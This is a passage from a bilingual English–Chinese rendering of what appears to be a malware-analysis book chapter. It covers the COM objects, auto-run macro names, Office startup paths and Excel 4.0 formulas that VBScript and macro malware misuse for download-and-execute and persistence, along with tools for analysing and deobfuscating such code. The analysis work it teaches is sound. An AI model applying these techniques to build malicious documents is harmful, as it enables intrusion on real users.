  - PREF_UL
  type: TYPE_NORMAL
  zh: '`Attributes`：此属性可修改以更改文件的属性。'
- en: '`CopyFile`/`Move`/`MoveFile`: This copies or moves a file to another location.'
  id: totrans-98
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`CopyFile`/`Move`/`MoveFile`：此功能用于将文件复制或移动到另一个位置。'
- en: '`DeleteFile`: This deletes the requested file.'
  id: totrans-99
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`DeleteFile`：此功能用于删除指定的文件。'
- en: '`Outlook.Application`: This allows attackers to access Outlook applications
    to spread malware or spam:'
  id: totrans-100
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`Outlook.Application`：此功能允许攻击者访问Outlook应用程序，以传播恶意软件或垃圾邮件。'
- en: '`GetNameSpace`: Some namespaces, such as MAPI, will give attackers access to
    a victim’s contacts'
  id: totrans-101
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`GetNameSpace`：某些命名空间，如MAPI，允许攻击者访问受害者的联系人。'
- en: '`CreateItem`: This allows for a new email to be created'
  id: totrans-102
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`CreateItem`：此功能允许创建新邮件。'
- en: '`Microsoft.XMLHTTP`/`MSXML2.XMLHTTP`: This allows attackers to send HTTP requests
    to interact with web applications:'
  id: totrans-103
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`Microsoft.XMLHTTP`/`MSXML2.XMLHTTP`：此功能允许攻击者发送HTTP请求，与Web应用程序交互。'
- en: '`Open`: This creates a request, such as `GET` or `POST`'
  id: totrans-104
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`Open`：此功能用于创建请求，例如`GET`或`POST`请求。'
- en: '`SetRequestHeader`: This sets custom headers; for example, for victim statistics,
    an additional basic authentication layer, or even data exfiltration'
  id: totrans-105
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`SetRequestHeader`：此功能用于设置自定义头部，例如用于受害者统计信息、额外的基本身份验证层，或甚至数据外泄。'
- en: '`Send`: This sends the request'
  id: totrans-106
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`Send`：此功能用于发送请求。'
- en: '`GetResponseHeader`/`GetAllResponseHeaders`: These properties check the response
    for extra information or basic server validation'
  id: totrans-107
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`GetResponseHeader`/`GetAllResponseHeaders`：这些属性用于检查响应中的额外信息或基本服务器验证。'
- en: '`ResponseText`/`ResponseBody`: These properties provide access to the actual
    response, such as a command or another malicious module'
  id: totrans-108
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`ResponseText`/`ResponseBody`：这些属性提供对实际响应的访问，例如命令或其他恶意模块。'
- en: '`MSXML2.ServerXMLHTTP`: This provides the same functionality as the previously
    mentioned XMLHTTP, but it is supposed to be used mainly from the server side.
    It is generally recommended because it handles redirects better.'
  id: totrans-109
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`MSXML2.ServerXMLHTTP`：此功能提供与前述XMLHTTP相同的功能，但主要用于服务器端。通常推荐使用此功能，因为它处理重定向更好。'
- en: '`WinHttp.WinHttpRequest`: Again, this provides similar functionality, but it
    is implemented in a different library.'
  id: totrans-110
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`WinHttp.WinHttpRequest`：此功能提供类似的功能，但它是通过不同的库实现的。'
- en: '`ADODB.Stream`: This allows attackers to work with streams of various types,
    as follows:'
  id: totrans-111
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`ADODB.Stream`：此功能允许攻击者处理各种类型的流，具体如下：'
- en: '`Write`: This writes to a stream object; this could be from the C&C response,
    for example'
  id: totrans-112
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`Write`：此方法用于向流对象写入数据，例如从 C&C 响应中写入数据。'
- en: '`SaveToFile`: This writes stream data to a file'
  id: totrans-113
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`SaveToFile`：此方法将流数据写入文件。'
- en: '`Read`/`ReadText`: These can be used to access the base64-encoded value'
  id: totrans-114
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`Read`/`ReadText`：这些方法可用于访问 base64 编码的值。'
- en: '`Microsoft.XMLDOM`/`MSXML.DOMDocument`: These were originally designed to work
    with XML `createElement`: This can be used together with `ADODB.Stream` to handle
    base64 encoding once it is used with the `bin.base64` `DataType` value and the
    `NodeTypedValue` property'
  id: totrans-115
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`Microsoft.XMLDOM`/`MSXML.DOMDocument`：这些最初是为处理 XML 设计的，`createElement`：可以与
    `ADODB.Stream` 一起使用，在与 `bin.base64` `DataType` 值以及 `NodeTypedValue` 属性一起使用时，用于处理
    base64 编码。'
- en: 'So, how can all this information be used when we’re performing an analysis?
    Here is a simple example of code executing another payload:'
  id: totrans-116
  prefs: []
  type: TYPE_NORMAL
  zh: 那么，如何在执行分析时利用这些信息呢？这里是一个简单的代码示例，执行另一个有效负载：
- en: '[PRE0]'
  id: totrans-117
  prefs: []
  type: TYPE_PRE
  zh: '[PRE0]'
- en: 'As you can see, once the object has been created, its method can be executed
    straight away. Among native methods, the following can be used to execute expressions
    and statements:'
  id: totrans-118
  prefs: []
  type: TYPE_NORMAL
  zh: 如你所见，一旦对象被创建，它的方法可以立即执行。在本地方法中，以下方法可用于执行表达式和语句：
- en: '`Eval`: This evaluates an expression and returns a result value. It interprets
    the `=` operator as a comparison rather than an assignment.'
  id: totrans-119
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`Eval`：此函数用于计算一个表达式并返回结果值。它将`=`运算符解释为比较操作符，而非赋值操作符。'
- en: '`Execute`: This executes a group of statements separated by colons or line
    breaks in the local scope.'
  id: totrans-120
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`Execute`：此方法用于在本地作用域内执行一组由冒号或换行符分隔的语句。'
- en: '`ExecuteGlobal`: This is the same as `Execute`, but for the global scope. It
    is commonly used by attackers to execute decoded blocks.'
  id: totrans-121
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`ExecuteGlobal`：此方法与 `Execute` 相同，但适用于全局作用域。攻击者常常用它来执行解码后的代码块。'
- en: Additionally, it is relatively straightforward to work with **Windows Management
    Instrumentation** (**WMI**) using VBScript. WMI is the infrastructure for managing
    data on Windows systems that gives access to various information, such as numerous
    system properties or a list of installed antivirus products. These are all potentially
    interesting to attackers.
  id: totrans-122
  prefs: []
  type: TYPE_NORMAL
  zh: 此外，使用 VBScript 操作 **Windows 管理工具** (**WMI**) 相对简单。WMI 是用于管理 Windows 系统中数据的基础设施，可以访问各种信息，例如许多系统属性或已安装的防病毒产品列表。这些对攻击者来说都是潜在的兴趣点。
- en: 'Here are two ways it can be accessed:'
  id: totrans-123
  prefs: []
  type: TYPE_NORMAL
  zh: 这里有两种方法可以访问：
- en: 'With the help of the `WbemScripting.SWbemLocator` object and its `ConnectServer`
    method to access `root\cimv2`:'
  id: totrans-124
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 借助 `WbemScripting.SWbemLocator` 对象及其 `ConnectServer` 方法来访问 `root\cimv2`：
- en: '[PRE1]'
  id: totrans-125
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE1]'
- en: 'Through the `winmgmts:` moniker:'
  id: totrans-126
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 通过 `winmgmts:` 标识符：
- en: '[PRE2]'
  id: totrans-127
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE2]'
- en: Now, let’s talk about what tools we can use to facilitate the analysis.
  id: totrans-128
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，让我们来讨论可以用来促进分析的工具。
- en: Static and dynamic analysis
  id: totrans-129
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 静态与动态分析
- en: 'The once-supported **Microsoft Script Debugger** has been replaced by **Microsoft
    Script Editor** and was distributed as part of MS Office up to its 2007 edition;
    it was later discontinued:'
  id: totrans-130
  prefs: []
  type: TYPE_NORMAL
  zh: 曾经支持的 **Microsoft 脚本调试器** 已被 **Microsoft 脚本编辑器** 取代，并且作为 MS Office 的一部分一直发布到
    2007 版本；后来该工具被停用：
- en: '![Figure 10.4 – The Microsoft Script Editor interface'
  id: totrans-131
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 10.4 – Microsoft 脚本编辑器界面'
- en: '](img/Figure_10.4_B18500.jpg)'
  id: totrans-132
  prefs: []
  type: TYPE_NORMAL
  zh: '](img/Figure_10.4_B18500.jpg)'
- en: Figure 10.4 – The Microsoft Script Editor interface
  id: totrans-133
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.4 – Microsoft 脚本编辑器界面
- en: 'For basic static analysis, a generic text editor that supports syntax highlighting
    might be good enough. For dynamic analysis, it is highly recommended to use **Visual
    Studio**. Even the free community edition provides all the necessary functionality
    to do this in a very efficient way. To start the debugging process, first, you
    may wish to just execute the script the following way:'
  id: totrans-134
  prefs: []
  type: TYPE_NORMAL
  zh: 对于基本的静态分析，一个支持语法高亮的通用文本编辑器可能就足够了。对于动态分析，强烈建议使用 **Visual Studio**。即使是免费的社区版也提供了进行高效分析所需的所有功能。要开始调试过程，你可能首先希望以以下方式执行脚本：
- en: '[PRE3]'
  id: totrans-135
  prefs: []
  type: TYPE_PRE
  zh: '[PRE3]'
- en: 'However, for most people, it won’t work straight away. Before that, you will
    need to make sure your IDE is registered as a JIT debugger. To do this for Visual
    Studio, go to its **Tools** | **Options...** | **Debugging** | **Just-In-Time**
    settings and check that the **Script** tick is set:'
  id: totrans-136
  prefs: []
  type: TYPE_NORMAL
  zh: 然而，对于大多数人来说，这不会立即生效。在此之前，你需要确保你的 IDE 已注册为 JIT 调试器。要为 Visual Studio 注册，进入其 **工具**
    | **选项...** | **调试** | **即时调试** 设置，确保 **脚本** 选项被勾选：
- en: '![Figure 10.5 – Registering Visual Studio as the JIT debugger for VBScript'
  id: totrans-137
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 10.5 – 将 Visual Studio 注册为 VBScript 的 JIT 调试器'
- en: '](img/Figure_10.5_B18500.jpg)'
  id: totrans-138
  prefs: []
  type: TYPE_NORMAL
  zh: '](img/Figure_10.5_B18500.jpg)'
- en: Figure 10.5 – Registering Visual Studio as the JIT debugger for VBScript
  id: totrans-139
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.5 – 将 Visual Studio 注册为 VBScript 的 JIT 调试器
- en: 'After this, executing the aforementioned `cscript` command will automatically
    start suggesting that you use Visual Studio for debugging:'
  id: totrans-140
  prefs: []
  type: TYPE_NORMAL
  zh: 之后，执行上述 `cscript` 命令将自动开始建议使用 Visual Studio 进行调试：
- en: '![Figure 10.6 – cscript suggesting Visual Studio for VBScript debugging'
  id: totrans-141
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 10.6 – cscript 提示使用 Visual Studio 进行 VBScript 调试'
- en: '](img/Figure_10.6_B18500.jpg)'
  id: totrans-142
  prefs: []
  type: TYPE_NORMAL
  zh: '](img/Figure_10.6_B18500.jpg)'
- en: Figure 10.6 – cscript suggesting Visual Studio for VBScript debugging
  id: totrans-143
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.6 – cscript 提示使用 Visual Studio 进行 VBScript 调试
- en: 'Once confirmed, everything is ready for you to start dynamic analysis:'
  id: totrans-144
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦确认，所有准备工作就绪，你可以开始动态分析了：
- en: '![Figure 10.7 – Debugging the VBScript ﬁle in Visual Studio'
  id: totrans-145
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 10.7 – 在 Visual Studio 中调试 VBScript 文件'
- en: '](img/Figure_10.7_B18500.jpg)'
  id: totrans-146
  prefs: []
  type: TYPE_NORMAL
  zh: '](img/Figure_10.7_B18500.jpg)'
- en: Figure 10.7 – Debugging the VBScript ﬁle in Visual Studio
  id: totrans-147
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.7 – 在 Visual Studio 中调试 VBScript 文件
- en: 'While it is relatively straightforward to encode the `.vbs` file into `.vbe`
    using the `EncodeScriptFile` method provided by the `Scripting.Encoder` object,
    there is no native tool to decode the `.vbe` scripts back to `.vbs`; otherwise,
    it would diminish its purpose:'
  id: totrans-148
  prefs: []
  type: TYPE_NORMAL
  zh: 尽管使用 `Scripting.Encoder` 对象提供的 `EncodeScriptFile` 方法将 `.vbs` 文件编码为 `.vbe` 相对简单，但并没有原生工具可以将
    `.vbe` 脚本解码回 `.vbs`；否则，这将削弱其目的：
- en: '![Figure 10.8 – The original and encoded VBScript ﬁles'
  id: totrans-149
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 10.8 – 原始和编码后的 VBScript 文件'
- en: '](img/Figure_10.8_B18500.jpg)'
  id: totrans-150
  prefs: []
  type: TYPE_NORMAL
  zh: '](img/Figure_10.8_B18500.jpg)'
- en: Figure 10.8 – The original and encoded VBScript ﬁles
  id: totrans-151
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.8 – 原始和编码后的 VBScript 文件
- en: However, there are several open source projects available that aim to solve
    this problem; for example, the `decode-vbe.py` tool by Didier Stevens.
  id: totrans-152
  prefs: []
  type: TYPE_NORMAL
  zh: 然而，确实有一些开源项目旨在解决这个问题；例如，Didier Stevens 的 `decode-vbe.py` 工具。
- en: 'When analyzing the code, it makes sense to pay particular attention to the
    following operations:'
  id: totrans-153
  prefs: []
  type: TYPE_NORMAL
  zh: 在分析代码时，特别需要关注以下操作：
- en: Filesystem and registry access
  id: totrans-154
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 文件系统和注册表访问
- en: Interaction with remote servers
  id: totrans-155
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 与远程服务器的交互
- en: Application and script execution
  id: totrans-156
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 应用程序与脚本执行
- en: Finally, let’s talk about obfuscation and how to handle it.
  id: totrans-157
  prefs: []
  type: TYPE_NORMAL
  zh: 最后，让我们谈谈混淆以及如何处理它。
- en: Deobfuscation
  id: totrans-158
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 解除混淆
- en: Quite often, VBS obfuscation utilizes pretty basic techniques, such as adding
    garbage comments or using strings that require character replacement before they
    can be used. Syntax highlighting appears to be quite useful when analyzing such
    files.
  id: totrans-159
  prefs: []
  type: TYPE_NORMAL
  zh: 很常见，VBS 混淆使用相当基础的技巧，如添加垃圾注释或使用需要字符替换后才能使用的字符串。语法高亮在分析此类文件时非常有用。
- en: 'Another common example is building a second-stage payload from the embedded
    data, such as from an array of integers, and then executing it dynamically, as
    shown in the following screenshot:'
  id: totrans-160
  prefs: []
  type: TYPE_NORMAL
  zh: 另一个常见的示例是从嵌入的数据构建第二阶段有效载荷，例如从一个整数数组，然后动态执行它，如下图所示：
- en: '![Figure 10.9 – VBScript malware dynamically builds a second-stage payload'
  id: totrans-161
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 10.9 – VBScript 恶意软件动态构建第二阶段有效载荷'
- en: '](img/Figure_10.9_B18500.jpg)'
  id: totrans-162
  prefs: []
  type: TYPE_NORMAL
  zh: '](img/Figure_10.9_B18500.jpg)'
- en: Figure 10.9 – VBScript malware dynamically builds a second-stage payload
  id: totrans-163
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.9 – VBScript 恶意软件动态构建第二阶段有效载荷
- en: 'One of the easiest ways to convert it into the actual code is to use a great
    online tool called **CyberChef**:'
  id: totrans-164
  prefs: []
  type: TYPE_NORMAL
  zh: 将其转换为实际代码的最简单方法之一是使用一个名为 **CyberChef** 的绝佳在线工具：
- en: '![Figure 10.10 – The second stage of the VBScript malware after decoding'
  id: totrans-165
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 10.10 – VBScript 恶意软件解码后的第二阶段'
- en: '](img/Figure_10.10_B18500.jpg)'
  id: totrans-166
  prefs: []
  type: TYPE_NORMAL
  zh: '](img/Figure_10.10_B18500.jpg)'
- en: Figure 10.10 – The second stage of the VBScript malware after decoding
  id: totrans-167
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.10 – VBScript 恶意软件解码后的第二阶段
- en: Once you have the actual functional code, the easiest way to handle it is to
    search for the functions you are most interested in (the ones that we previously
    listed) and check their parameters to get information about dropped or exfiltrated
    files, executed commands, accessed registry keys, and C&C(s) to connect. If the
    obfuscation layer makes functionality completely obscure, then it is necessary
    to keep track of variables accumulating at the next stage script. You can iterate
    through the layers one by one, printing or watching them to get the next block’s
    functionality until the main block of code becomes readable.
  id: totrans-168
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦你获得了实际的功能代码，处理它的最简单方法是搜索你最感兴趣的函数（我们之前列出的那些），并检查它们的参数，以获取有关丢弃或外泄文件、执行的命令、访问的注册表项以及需要连接的
    C&C（命令与控制）信息。如果混淆层使得功能完全不清晰，那么需要追踪在下一个阶段脚本中累积的变量。你可以逐层迭代，逐一打印或观察它们，直到主代码块变得可读。
- en: Now that we’ve learned about VBScript, let’s talk about a slightly different
    topic – macros and the threats that rely on them.
  id: totrans-169
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们了解了 VBScript，让我们谈谈一个稍微不同的话题——宏以及依赖它们的威胁。
- en: VBA and Excel 4.0 (XLM) macros and more
  id: totrans-170
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: VBA和Excel 4.0（XLM）宏及其他
- en: While many loud malware attacks were related to exploited vulnerabilities, humans
    remain the weakest link in the defense chain. Social engineering techniques can
    allow malicious actors to successfully execute their code without creating or
    buying complicated exploits.
  id: totrans-171
  prefs: []
  type: TYPE_NORMAL
  zh: 虽然许多高调的恶意软件攻击与利用的漏洞相关，但人类依然是防御链中最弱的环节。社会工程学技巧使恶意行为者能够在不创建或购买复杂漏洞的情况下成功执行其代码。
- en: Since many organizations now provide cybersecurity training for all newcomers,
    many people know basic things, such as that it is unsafe to click on links or
    executable files received by various means from outside of the organization or
    the group of people that you know. Therefore, the attackers have to invent new
    ways to trick users, and documents containing malicious macros are a great example
    of these ongoing efforts.
  id: totrans-172
  prefs: []
  type: TYPE_NORMAL
  zh: 由于许多组织现在为所有新员工提供网络安全培训，许多人已经了解了一些基本常识，例如，通过各种方式从组织外部或你认识的人群中接收到的链接或可执行文件是非常不安全的。因此，攻击者必须发明新的方法来欺骗用户，包含恶意宏的文档就是这些持续努力的一个典型例子。
- en: VBA macros
  id: totrans-173
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: VBA宏
- en: MS Office macros incorporate the **Visual Basic for Applications** (**VBA**)
    programming language. This is derived from Visual Basic 6, which was discontinued
    a long time ago. VBA survived and was later upgraded to version 7\. Normally,
    the code can only run within a host application, and it is built into most Microsoft
    Office applications (even for macOS).
  id: totrans-174
  prefs: []
  type: TYPE_NORMAL
  zh: MS Office宏包含了**Visual Basic for Applications**（**VBA**）编程语言。它源自已经停用很久的Visual
    Basic 6。VBA幸存下来，并在后来升级到了7版本。通常，代码只能在宿主应用程序中运行，并且它被集成在大多数Microsoft Office应用程序中（即使是macOS版）。
- en: Basic syntax
  id: totrans-175
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 基本语法
- en: 'VBA is a dialect of Visual Basic and inherited its syntax. VBScript can be
    considered as a subset of VBA with a few simplifications, mainly caused by different
    application models. The same elements need to be paid attention to when analyzing
    VBA objects:'
  id: totrans-176
  prefs: []
  type: TYPE_NORMAL
  zh: VBA是Visual Basic的一种方言，继承了其语法。VBScript可以看作是VBA的一个子集，简化了一些功能，主要是由于不同的应用程序模型。在分析VBA对象时，仍需要注意相同的元素：
- en: File and registry operations
  id: totrans-177
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 文件和注册表操作
- en: Network activity
  id: totrans-178
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 网络活动
- en: Executed commands
  id: totrans-179
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 执行的命令
- en: The list of COM objects that are of the attacker’s interest is also the same
    as they are for VBScript. The only difference is that some functionality can be
    accessed without creating objects; for example, the `Shell` method.
  id: totrans-180
  prefs: []
  type: TYPE_NORMAL
  zh: 攻击者关注的COM对象列表与VBScript的相同。唯一的区别是，某些功能可以在不创建对象的情况下访问；例如，`Shell`方法。
- en: 'To ensure that it will be executed automatically, malware must use one of the
    standard function names that will define when it should happen. These names are
    slightly different for different MS Office products. Here are the most commonly
    misused ones:'
  id: totrans-181
  prefs: []
  type: TYPE_NORMAL
  zh: 为确保恶意软件能够自动执行，它必须使用某些标准函数名来定义何时执行。这些函数名在不同的MS Office产品中略有不同。以下是最常被滥用的几个：
- en: '`AutoOpen`/`Auto_Open`'
  id: totrans-182
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`AutoOpen`/`Auto_Open`'
- en: '`AutoExit`/`Auto_Close`'
  id: totrans-183
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`AutoExit`/`Auto_Close`'
- en: '`AutoExec`'
  id: totrans-184
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`AutoExec`'
- en: '`Document_Open`/`Workbook_Open`'
  id: totrans-185
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`Document_Open`/`Workbook_Open`'
- en: 'Here is an example of `Document_Open` being used for this purpose:'
  id: totrans-186
  prefs: []
  type: TYPE_NORMAL
  zh: 这是一个使用`Document_Open`实现这一目的的示例：
- en: '![Figure 10.11 – A malicious VBA macro registering the Document_Open routine
    to achieve execution'
  id: totrans-187
  prefs: []
  type: TYPE_NORMAL
  zh: '![图10.11 – 一个恶意的VBA宏注册`Document_Open`例程以实现执行'
- en: '](img/Figure_10.11_B18500.jpg)'
  id: totrans-188
  prefs: []
  type: TYPE_NORMAL
  zh: '](img/Figure_10.11_B18500.jpg)'
- en: Figure 10.11 – A malicious VBA macro registering the Document_Open routine to
    achieve execution
  id: totrans-189
  prefs: []
  type: TYPE_NORMAL
  zh: 图10.11 – 一个恶意的VBA宏注册`Document_Open`例程以实现执行
- en: Malware can also install dedicated handlers so that it can be executed later
    under some condition, for example, using the `Application.OnSheetActivate` function.
  id: totrans-190
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件还可以安装专用的处理程序，以便在某些条件下稍后执行，例如，使用`Application.OnSheetActivate`函数。
- en: 'MS Office has its own auto-start directories that are commonly misused by malware
    to achieve persistence. They do this by placing their code there. Here are the
    standard ones for different products and versions:'
  id: totrans-191
  prefs: []
  type: TYPE_NORMAL
  zh: MS Office有自己的自动启动目录，恶意软件常通过滥用这些目录来实现持久性。它们通过将代码放置在这些目录中来实现。以下是不同产品和版本的标准目录：
- en: '`%APPDATA%\Microsoft\Word\STARTUP`'
  id: totrans-192
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`%APPDATA%\Microsoft\Word\STARTUP`'
- en: '`C:\Program Files\Microsoft Office\[root\]<Office1x>\STARTUP`'
  id: totrans-193
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`C:\Program Files\Microsoft Office\[root\]<Office1x>\STARTUP`'
- en: '`%APPDATA%\Microsoft\Excel\XLSTART`'
  id: totrans-194
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`%APPDATA%\Microsoft\Excel\XLSTART`'
- en: '`C:\Program Files\Microsoft Office\[root\]<Office1x>\XLSTART`'
  id: totrans-195
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`C:\Program Files\Microsoft Office\[root\]<Office1x>\XLSTART`'
- en: 'Apart from that, persistence can be achieved by manipulating global macro files:'
  id: totrans-196
  prefs: []
  type: TYPE_NORMAL
  zh: 除此之外，通过操控全局宏文件也可以实现持久性：
- en: '`Normal.dot`/`.dotm`: The global macro template for Word (in `%APPDATA%\Microsoft\Templates`)'
  id: totrans-197
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`Normal.dot`/`.dotm`：Word的全局宏模板（在`%APPDATA%\Microsoft\Templates`中）'
- en: '`Personal.xls`/`.xlsb`: The global macro workbook for Excel (in `XLSTART`)'
  id: totrans-198
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`Personal.xls`/`.xlsb`：Excel的全局宏工作簿（在`XLSTART`中）'
- en: Now, let’s talk about what tools can help us analyze malicious macros.
  id: totrans-199
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，让我们来谈谈哪些工具可以帮助我们分析恶意宏。
- en: Static and dynamic analysis
  id: totrans-200
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 静态和动态分析
- en: 'Unlike VBScript, VBA has a native editor in MS Office that can be accessed
    from the **Developer** tab, which is hidden by default. It can be enabled in **Word
    Options** in the **Customize Ribbon** menu:'
  id: totrans-201
  prefs: []
  type: TYPE_NORMAL
  zh: 与VBScript不同，VBA在MS Office中有一个原生编辑器，可以通过**开发工具**选项卡访问，该选项卡默认情况下是隐藏的。可以在**Word选项**的**自定义功能区**菜单中启用它：
- en: '![Figure 10.12 – Enabling the VBA macro editor in MS Oﬃce options'
  id: totrans-202
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 10.12 – 在 MS Office 选项中启用 VBA 宏编辑器'
- en: '](img/Figure_10.12_B18500.jpg)'
  id: totrans-203
  prefs: []
  type: TYPE_NORMAL
  zh: '](img/Figure_10.12_B18500.jpg)'
- en: Figure 10.12 – Enabling the VBA macro editor in MS Oﬃce options
  id: totrans-204
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.12 – 在 MS Office 选项中启用 VBA 宏编辑器
- en: It supports debugging the code in this way, making both static and dynamic analysis
    relatively straightforward.
  id: totrans-205
  prefs: []
  type: TYPE_NORMAL
  zh: 它支持以这种方式调试代码，使得静态和动态分析相对直接。
- en: Another tool that can extract macros from documents is `info` command-line argument.
    Apart from this, the previously mentioned tools from the **oletools** project
    (especially **olevba**) and **oledump** can be used to extract and analyze VBA
    macros as well. If the engineer wants to work with p-code instead of source code
    for some reason, the **pcodedmp** project aims to provide the required functionality.
  id: totrans-206
  prefs: []
  type: TYPE_NORMAL
  zh: 另一个可以从文档中提取宏的工具是`info`命令行参数。除此之外，之前提到的来自**oletools**项目的工具（尤其是**olevba**）和**oledump**也可以用来提取和分析VBA宏。如果工程师因为某些原因想处理p-code而不是源代码，**pcodedmp**项目旨在提供所需的功能。
- en: Finally, **ViperMonkey** can be used to emulate some VBA macros and, in this
    way, help handle obfuscation.
  id: totrans-207
  prefs: []
  type: TYPE_NORMAL
  zh: 最后，**ViperMonkey**可以用来模拟一些VBA宏，从而帮助处理混淆。
- en: Excel 4.0 (XLM) macros
  id: totrans-208
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: Excel 4.0 (XLM) 宏
- en: XLM macros, also known as formulas, are a 30-year-old feature of Microsoft Excel
    that suddenly gained popularity among attackers recently. An example of it is
    a `SUM` function, which is commonly used to automatically calculate a sum of numbers
    spread across multiple cells. While some of them may be dangerous out of the box,
    such as `EXEC`, which allows for arbitrary command execution, in most cases, attackers
    chain many benign ones to implement malicious functionality.
  id: totrans-209
  prefs: []
  type: TYPE_NORMAL
  zh: XLM宏，也称为公式，是Microsoft Excel中存在了30年的功能，最近突然在攻击者中获得了流行。一个例子是`SUM`函数，通常用于自动计算分布在多个单元格中的数字总和。虽然其中一些本身可能是危险的，例如`EXEC`，它允许任意命令执行，但在大多数情况下，攻击者会将许多无害的宏链在一起，以实现恶意功能。
- en: Basic syntax
  id: totrans-210
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 基本语法
- en: 'Here are some examples of commonly misused formulas in the final deobfuscated
    payload:'
  id: totrans-211
  prefs: []
  type: TYPE_NORMAL
  zh: 以下是一些常见的在最终去混淆有效载荷中被误用的公式示例：
- en: '`IF(logical_test, value_if_true, value_if_false)`'
  id: totrans-212
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`IF(logical_test, value_if_true, value_if_false)`'
- en: '`SEARCH(find_text, within_text, start_num)`'
  id: totrans-213
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`SEARCH(find_text, within_text, start_num)`'
- en: '`CALL(dll_name, api_name, format, arg0, …)`'
  id: totrans-214
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`CALL(dll_name, api_name, format, arg0, …)`'
- en: Another option similar to the `CALL` option is `REGISTER`.
  id: totrans-215
  prefs: []
  type: TYPE_NORMAL
  zh: 另一个类似于`CALL`选项的选项是`REGISTER`。
- en: An obvious example of a simple malicious payload utilizing them would be calling
    APIs such as `URLDownloadToFile` and `ShellExecuteA` to deliver and execute the
    next stage of the payload.
  id: totrans-216
  prefs: []
  type: TYPE_NORMAL
  zh: 一个明显的简单恶意有效载荷示例就是调用`URLDownloadToFile`和`ShellExecuteA`等API来传送并执行下一个阶段的有效载荷。
- en: But in reality, pretty much all modern malicious macros will be obfuscated and
    will use a different set of macros to build the actual malicious functionality.
    We are going to cover them here. For `.xls` documents following the `.xlsb` and
    `.xlsm` OOXML-based Excel documents, the corresponding data can generally be found
    in the `\xl\macrosheets\` directory in BIFF12 and XML formats, respectively.
  id: totrans-217
  prefs: []
  type: TYPE_NORMAL
